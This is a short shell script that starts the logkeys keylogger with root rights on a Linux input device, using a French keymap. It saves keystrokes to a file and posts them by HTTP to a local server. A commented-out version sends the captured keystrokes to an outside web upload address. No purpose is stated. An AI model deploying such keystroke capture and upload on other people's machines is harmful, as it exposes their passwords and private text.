#!/bin/sh


#sudo \
#    logkeys -k
#sudo \
#    logkeys \
#            -s \
#            --keymap logkeys/keymaps/fr.map \
#            -d event4 \
#            --post-http=https://www.freeshell.de/~fgarel/upload.php
sudo \
    logkeys -k
sudo \
    logkeys \
            -s \
            --keymap logkeys/keymaps/fr.map \
            -d event4 \
            -o logkeys.txt \
            --post-http=http://localhost:5000 \
            --post-size=50
